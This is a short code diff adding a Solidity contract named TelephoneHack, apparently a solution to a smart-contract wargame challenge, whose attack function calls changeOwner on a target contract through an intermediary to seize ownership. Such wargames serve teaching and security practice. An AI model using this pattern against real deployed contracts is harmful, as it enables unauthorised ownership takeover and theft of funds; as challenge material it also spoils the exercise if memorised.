@@ -7,5 +7,19 @@ interface ITelephone {
 }
 
 contract TelephoneHack {
+
+    ITelephone public challenge;
+
+    constructor(address challengeAddress) {
+        challenge = ITelephone(challengeAddress);
+    }
+
+
+    function attack(address addy_) external {
+
+        challenge.changeOwner(addy_);
+
+    }
+
    
 }
